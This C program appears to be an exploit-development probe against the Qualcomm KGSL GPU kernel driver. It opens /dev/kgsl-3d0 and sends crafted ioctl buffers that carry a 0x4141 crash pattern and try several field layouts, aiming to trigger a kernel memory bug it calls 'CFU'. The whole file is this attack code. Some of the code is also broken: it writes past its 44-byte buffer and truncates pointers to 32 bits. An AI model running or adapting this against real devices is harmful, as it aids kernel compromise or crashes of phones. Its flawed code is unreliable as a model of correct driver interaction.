#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("open: %d\n", errno); return 1; }
    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    int r = ioctl(fd, 0xc0080913, &ctx);
    printf("CREATE id=%u\n\n", ctx.id);
    if (r < 0) { close(fd); return 1; }

    /* Try ALL working offsets with crash pattern */
    struct { uint64_t ga; uint64_t sw; } ib = {
        0x0000000000000000ULL,
        0x4141414141414141ULL  /* CRASH if CFU fires! */
    };
    printf("ibdesc at %p (CRASH PATTERN)\n\n", &ib);

    /* Test each working layout from the scan */
    int working_layouts[][2] = {
        {0x04, 0x0c},  /* ptr@+0x04, size@+0x0c (num@+0x10) */
        {0x10, 0x18},  /* ptr@+0x10, size@+0x18 (num@+0x1c) */
        {0x18, 0x20},  /* ptr@+0x18, size@+0x20 (num@+0x24) */
        {0x1c, 0x24},  /* ptr@+0x1c, size@+0x24 (num@+0x28) */ 
        {0x20, 0x28},  /* ptr@+0x20, size@+0x28 (num@+0x2c) */
        {0x24, 0x2c},  /* ptr@+0x24, size@+0x2c (num@+0x30) */
    };

    for (int li = 0; li < sizeof(working_layouts)/sizeof(working_layouts[0]); li++) {
        int p_off = working_layouts[li][0];
        int s_off = working_layouts[li][1];
        
        uint8_t sbuf[44];
        memset(sbuf, 0, 44);
        *(uint32_t*)(sbuf+0x00) = ctx.id;
        *(uint32_t*)(sbuf+p_off) = (uint32_t)(uintptr_t)&ib;
        *(uint32_t*)(sbuf+s_off) = 16;  /* size */
        *(uint32_t*)(sbuf+s_off+4) = 1;  /* num */
        
        errno = 0;
        r = ioctl(fd, 0xc02c093d, sbuf);
        printf("ptr@+0x%02x: ret=%d errno=%d %s\n", p_off, r, errno,
               r==0?"⚠️ CFU MAY HAVE FIRED":strerror(errno));
        
        if (r != 0) break;  /* Stop if one fails */
    }

    /* Also test: fill entire 44B with zeros EXCEPT ctx_id + ibdesc ptr */
    printf("\n=== Minimum fields test ===\n");
    {
        uint8_t sbuf[44];
        memset(sbuf, 0, 44);
        *(uint32_t*)(sbuf+0x00) = ctx.id;
        *(uint32_t*)(sbuf+0x04) = (uint32_t)(uintptr_t)&ib;  /* ptr@+4 */
        *(uint32_t*)(sbuf+0x0c) = 16;   /* size@+12 */
        *(uint32_t*)(sbuf+0x10) = 1;    /* num@+16 */
        errno = 0; r = ioctl(fd, 0xc02c093d, sbuf);
        printf("minimal(ptr@+4): ret=%d errno=%d %s\n", r, errno,
               r==0?"⚠️ CFU!":strerror(errno));
    }

    /* Test with ptr at +0x20 (from disassembly: ldp at +0x20) */
    {
        uint8_t sbuf[44];
        memset(sbuf, 0, 44);
        *(uint32_t*)(sbuf+0x00) = ctx.id;
        *(uint32_t*)(sbuf+0x20) = (uint32_t)(uintptr_t)&ib;  /* ptr@+32 */
        *(uint32_t*)(sbuf+0x28) = 16;   /* size@+40 */
        *(uint32_t*)(sbuf+0x2c) = 0;    /* num@+44? outside! */
        /* Adjust: fill whole range */
        *(uint32_t*)(sbuf+0x24) = 16;   /* try size@+36 */
        *(uint32_t*)(sbuf+0x28) = 1;    /* try num@+40 */
        errno = 0; r = ioctl(fd, 0xc02c093d, sbuf);
        printf("ptr@+0x20: ret=%d errno=%d %s\n", r, errno,
               r==0?"⚠️ CFU!":strerror(errno));
    }

    ioctl(fd, 0x40040914, &ctx.id);
    close(fd);
    printf("\n=== Kernel survived — CFU not actually called ===\n");
    return 0;
}
